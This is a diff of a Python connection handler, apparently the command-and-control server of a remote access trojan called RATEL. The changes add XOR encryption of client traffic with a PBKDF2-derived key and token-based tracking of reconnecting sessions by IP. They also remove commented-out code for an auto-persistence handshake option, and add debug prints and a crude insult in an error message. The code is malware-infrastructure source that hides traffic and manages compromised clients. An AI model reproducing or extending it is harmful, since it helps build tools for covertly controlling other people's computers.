@@ -3,24 +3,28 @@ import threading
 import time
 import socket
 import os
-import binascii
 from .other import printColor
+
+from .other import XOREncryption
+from .other import generate_PBKDF2_key
 from .sql import Sql
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT, SPLIT 
 
 
 
 class Handler(threading.Thread):
+    '''
+    This class allows to manage the incoming connection, 
+    it also has class attributes that are essential to the RATEL project such as dict_conn, number_conn, status_connection_display, etc...
+    '''
     #Manage incoming connections with a thread system
     dict_conn={}# dict of list | dict = socket,address  Stores all socket, ip, port and connection health status.
     number_conn=0  #count number of connexions
-    status_connection_display = True 
+    status_connection_display = True  #If this class attribute is true then all new connections will be displayed on the screen. 
+    PBKDF2_Key = None #Generates the key to encrypt and decrypt data using the XOR algorithm.
     start_handler = False
 
-#    ptable = PrettyTable() #Ascii tables dynamic.
-#    ptable.field_names =["Session","IP","Port","Is he alive"] #append title of row.
-
-    def __init__(self,host,port,display, ObjSql):
+    def __init__(self,host,port,display, ObjSql,password):
 
         threading.Thread.__init__(self)
         self.port = port 
@@ -29,6 +33,7 @@ class Handler(threading.Thread):
         self.display = display
         self.ObjSql = ObjSql
         
+        Handler.PBKDF2_Key = generate_PBKDF2_key(password)
 
     def initialization(self):
         """
@@ -106,6 +111,7 @@ class Handler(threading.Thread):
             #handshake.daemon = True
             handshake.start()
             handshake.join()
+            printColor("error","finish")
 
 
 
@@ -124,7 +130,7 @@ The client first sends this information, then the server sends the parameters as
         self.address = address
         self.ObjSql = ObjSql
 
-
+    '''
     def sendUltraSafe(self, data):
         
         try:
@@ -148,6 +154,7 @@ The client first sends this information, then the server sends the parameters as
                     pass
         
         self.conn.settimeout(None)
+    '''
 
 
     def recvUltraSafe(self):
@@ -164,12 +171,13 @@ The client first sends this information, then the server sends the parameters as
         else:   
             try:
                 print("SEND confirmation in recvultrasafe.")
-                self.conn.send(b"\r\n")
+                self.conn.send(XOREncryption("\r\n",Handler.PBKDF2_Key).encode())
             except Exception:
                 printColor("error", "[-] Error in recvUltraSafe when confirming.")
  
         self.conn.settimeout(None)
-        return data
+        
+        return XOREncryption(data,Handler.PBKDF2_Key)
     
 
     def recvFirstInfo(self):
@@ -185,23 +193,33 @@ The client first sends this information, then the server sends the parameters as
         name_user = "UNKNOWN"
         token = "UNKNOWN"
 
+        max_error = 0 #if max error > 4 stop  loop while. 
+
         while True:
             data = self.recvUltraSafe()
+            
+            print("DATA IN LOOP____>",data, "<------")
+            print("len: ", len(data))
+            
             #print(data)
             if(data == "\r\n"):
                 print("Stop recvFirstInfo")
                 break
-
+           
             tmp = data.split(SPLIT)
-
-            if(tmp[0]=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
+            print("\nSPLIT: ",tmp,"\n")
+            if(tmp[0]=="MOD_RECONNECT"): #MOD_RECONNECT  | TOKEN fdsafafsdfsadf3454sdfasdf5
                 print("MOD RECONNECT DETECT")
                 token = tmp[1]
-                
+                print("TOKKEN: ", token)
+                print(self.address)
                 if bool(Handler.dict_conn): 
                     for value in Handler.dict_conn.values():
-                        if(value[NB_TOKEN] == token): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
+                        #cette ligne qui pose pb:
+                        if(value[NB_TOKEN] == token and value[NB_IP] == self.address[0]): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
                             print("!!!!Token doublon!!!!")
+                            print(self.address)
+
                             already_in_the_dictionary = True
                             nb_session_of_conn = value[NB_SESSION]
 
@@ -224,6 +242,13 @@ The client first sends this information, then the server sends the parameters as
             else:
                 printColor("error","[-] An error occurred during handshake mode.")
                 printColor("error","[-] Information may be recorded as UNKNOWN.\n")
+                
+                if(max_error > 4): #4 error max
+                    printColor("error","TROP DERREUR TA MERE")
+                    break
+                else:
+                    max_error +=1 
+                
 
 
         #append data in dict
@@ -239,24 +264,15 @@ The client first sends this information, then the server sends the parameters as
             list_info.append(token)
             return list_info
 
-
+    '''
     def sendParameterOfClient(self): #NOT USE
         #?????????
-        '''
-        if(self.auto_persistence):
-            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"True")
-            #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
-        
-        else:
-            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"False")
-            #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False") 
-        '''
         #print("SEND TOKEN")
         #time.sleep(0.3)
         self.sendUltraSafe("\r\n") #end echange.
         
         #print("FINISH handshake")
-
+    '''
 
     def run(self):
 
@@ -307,6 +323,7 @@ The client first sends this information, then the server sends the parameters as
 
         #self.conn.send(b"dir")  
         printColor("information","\n\n[FINISH]")
+
         
 
 
